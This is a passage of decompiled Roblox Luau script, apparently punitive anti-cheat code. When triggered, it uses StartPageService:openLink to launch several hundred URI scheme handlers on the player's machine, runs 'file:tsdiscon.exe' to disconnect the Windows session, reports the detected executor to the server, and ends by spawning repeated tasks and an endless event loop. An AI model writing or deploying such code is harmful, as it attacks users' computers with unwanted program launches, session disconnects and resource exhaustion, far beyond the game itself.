                                "dvb",
                                "dvx",
                                "dweb",
                                "ed2k",
                                "eid",
                                "elsi",
                                "embedded",
                                "ens",
                                "ethereum",
                                "example",
                                "facetime",
                                "fax",
                                "feed",
                                "feedready",
                                "fido",
                                "file",
                                "filesystem",
                                "finger",
                                "first-run-pen-experience",
                                "fish",
                                "fm",
                                "ftp",
                                "fuchsia-pkg",
                                "geo",
                                "gg",
                                "git",
                                "gitoid",
                                "gizmoproject",
                                "go",
                                "gopher",
                                "graph",
                                "grd",
                                "gtalk",
                                "h323",
                                "ham",
                                "hcap",
                                "hcp",
                                "hs20",
                                "http",
                                "https",
                                "hxxp",
                                "hxxps",
                                "hydrazone",
                                "hyper",
                                "iax",
                                "icap",
                                "icon",
                                "ilstring",
                                "im",
                                "imap",
                                "info",
                                "iotdisco",
                                "ipfs",
                                "ipn",
                                "ipns",
                                "ipp",
                                "ipps",
                                "irc",
                                "irc6",
                                "ircs",
                                "iris",
                                "iris.beep",
                                "iris.lwz",
                                "iris.xpc",
                                "iris.xpcs",
                                "isostore",
                                "itms",
                                "jabber",
                                "jar",
                                "jms",
                                "keyparc",
                                "lastfm",
                                "lbry",
                                "ldap",
                                "ldaps",
                                "leaptofrogans",
                                "lid",
                                "lorawan",
                                "lpa",
                                "lvlt",
                                "machineProvisioningProgressReporter",
                                "magnet",
                                "mailserver",
                                "mailto",
                                "maps",
                                "market",
                                "matrix",
                                "message",
                                "microsoft.windows.camera",
                                "microsoft.windows.camera.multipicker",
                                "microsoft.windows.camera.picker",
                                "mid",
                                "mms",
                                "modem",
                                "mongodb",
                                "moz",
                                "ms-access",
                                "ms-appinstaller",
                                "ms-browser-extension",
                                "ms-calculator",
                                "ms-drive-to",
                                "ms-enrollment",
                                "ms-excel",
                                "ms-eyecontrolspeech",
                                "ms-gamebarservices",
                                "ms-gamingoverlay",
                                "ms-getoffice",
                                "ms-help",
                                "ms-infopath",
                                "ms-inputapp",
                                "ms-launchremotedesktop",
                                "ms-lockscreencomponent-config",
                                "ms-media-stream-id",
                                "ms-meetnow",
                                "ms-mixedrealitycapture",
                                "ms-mobileplans",
                                "ms-newsandinterests",
                                "ms-officeapp",
                                "ms-people",
                                "ms-personacard",
                                "ms-project",
                                "ms-powerpoint",
                                "ms-publisher",
                                "ms-recall",
                                "ms-remotedesktop",
                                "ms-remotedesktop-launch",
                                "ms-restoretabcompanion",
                                "ms-screenclip",
                                "ms-screensketch",
                                "ms-search",
                                "ms-search-repair",
                                "ms-secondary-screen-controller",
                                "ms-secondary-screen-setup",
                                "ms-settings",
                                "ms-settings-airplanemode",
                                "ms-settings-bluetooth",
                                "ms-settings-camera",
                                "ms-settings-cellular",
                                "ms-settings-cloudstorage",
                                "ms-settings-connectabledevices",
                                "ms-settings-displays-topology",
                                "ms-settings-emailandaccounts",
                                "ms-settings-language",
                                "ms-settings-location",
                                "ms-settings-lock",
                                "ms-settings-nfctransactions",
                                "ms-settings-notifications",
                                "ms-settings-power",
                                "ms-settings-privacy",
                                "ms-settings-proximity",
                                "ms-settings-screenrotation",
                                "ms-settings-wifi",
                                "ms-settings-workplace",
                                "ms-spd",
                                "ms-stickers",
                                "ms-sttoverlay",
                                "ms-transit-to",
                                "ms-useractivityset",
                                "ms-virtualtouchpad",
                                "ms-visio",
                                "ms-walk-to",
                                "ms-whiteboard",
                                "ms-whiteboard-cmd",
                                "ms-widgetboard",
                                "ms-widgets",
                                "ms-word",
                                "msnim",
                                "msrp",
                                "msrps",
                                "mss",
                                "mt",
                                "mtqp",
                                "mumble",
                                "mupdate",
                                "mvn",
                                "mvrp",
                                "mvrps",
                                "news",
                                "nfs",
                                "ni",
                                "nih",
                                "nntp",
                                "notes",
                                "num",
                                "ocf",
                                "oid",
                                "onenote",
                                "onenote-cmd",
                                "opaquelocktoken",
                                "openid",
                                "openpgp4fpr",
                                "otpauth",
                                "p1",
                                "pack",
                                "palm",
                                "paparazzi",
                                "payment",
                                "payto",
                                "pkcs11",
                                "platform",
                                "pop",
                                "pres",
                                "prospero",
                                "proxy",
                                "pwid",
                                "psyc",
                                "pttp",
                                "qb",
                                "query",
                                "quic-transport",
                                "redis",
                                "rediss",
                                "reload",
                                "res",
                                "resource",
                                "rmi",
                                "rsync",
                                "rtmfp",
                                "rtmp",
                                "rtsp",
                                "rtsps",
                                "rtspu",
                                "sarif",
                                "secondlife",
                                "secret-token",
                                "service",
                                "session",
                                "sftp",
                                "sgn",
                                "shc",
                                "shelter",
                                "shttp",
                                "sieve",
                                "simpleledger",
                                "simplex",
                                "sip",
                                "sips",
                                "skype",
                                "smb",
                                "smp",
                                "sms",
                                "smtp",
                                "snews",
                                "snmp",
                                "soap.beep",
                                "soap.beeps",
                                "soldat",
                                "spiffe",
                                "spotify",
                                "ssb",
                                "ssh",
                                "starknet",
                                "steam",
                                "stun",
                                "stuns",
                                "submit",
                                "svn",
                                "swh",
                                "swid",
                                "swidpath",
                                "tag",
                                "taler",
                                "teamspeak",
                                "teapot",
                                "teapots",
                                "tel",
                                "teliaeid",
                                "telnet",
                                "tftp",
                                "things",
                                "thismessage",
                                "thzp",
                                "tip",
                                "tn3270",
                                "tool",
                                "turn",
                                "turns",
                                "tv",
                                "udp",
                                "unreal",
                                "upt",
                                "urn",
                                "ut2004",
                                "uuid-in-package",
                                "v-event",
                                "vemmi",
                                "ventrilo",
                                "ves",
                                "videotex",
                                "vnc",
                                "view-source",
                                "vscode",
                                "vscode-insiders",
                                "vsls",
                                "w3",
                                "wais",
                                "web3",
                                "wcr",
                                "webcal",
                                "web+ap",
                                "wifi",
                                "wpid",
                                "ws",
                                "wss",
                                "wtai",
                                "wyciwyg",
                                "xcon",
                                "xcon-userid",
                                "xfire",
                                "xmlrpc.beep",
                                "xmlrpc.beeps",
                                "xmpp",
                                "xftp",
                                "xrcp",
                                "xri",
                                "ymsgr",
                                "z39.50",
                                "z39.50r",
                                "z39.50s"
                            } do
                                pcall(function()
                                    game:GetService("StartPageService"):openLink((("%*:"):format(v_u_175)))
                                end)
                            end
                            pcall(function()
                                game:GetService("StartPageService"):openLink("file:tsdiscon.exe")
                            end)
                        end
                    end)
                end)
                local v176, v177
                if v_u_174.identifyexecutor then
                    v176, v177 = v_u_174.identifyexecutor()
                else
                    v176 = "Couldnt fetch D:"
                    v177 = ""
                end
                if v_u_11 then
                    v_u_11:FireServer({
                        "Kick",
                        { "4832", (("%* : %*"):format(v176, v177)) }
                    })
                end
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
                v_u_6.spawn(v_u_43[1])
            end
        end
        return ""
    end
    v_u_2(v172).__metatable = {}
    while true do
        v171:Fire({
            [v172] = {}
        })
        v_u_6.wait()
    end
end)
